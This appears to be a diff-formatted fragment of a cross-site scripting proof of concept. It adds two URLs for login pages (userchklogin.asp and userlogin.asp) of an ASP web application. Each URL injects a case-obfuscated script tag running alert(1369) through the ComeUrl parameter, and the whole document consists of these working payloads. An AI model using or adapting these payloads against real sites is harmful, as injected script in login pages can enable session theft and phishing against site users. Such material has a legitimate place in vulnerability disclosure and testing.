@@ -1,0 +1,2 @@
+http://www.example.com/[Path]/userchklogin.asp?UserName=Pouya&amp;Password=Pouya&amp;CookieDate=0&amp;ComeUrl=&gt;&quot;&gt;&lt;ScRiPt%20%0a%0d&gt;alert(1369)%3B&lt;/ScRiPt&gt;&amp;Submit=%C8%B7%C8%CF
+http://www.example.com/[Path]/userlogin.asp?ComeUrl=&gt;&quot;&gt;&lt;ScRiPt%20%0a%0d&gt;alert(1369)%3B&lt;/ScRiPt&gt;
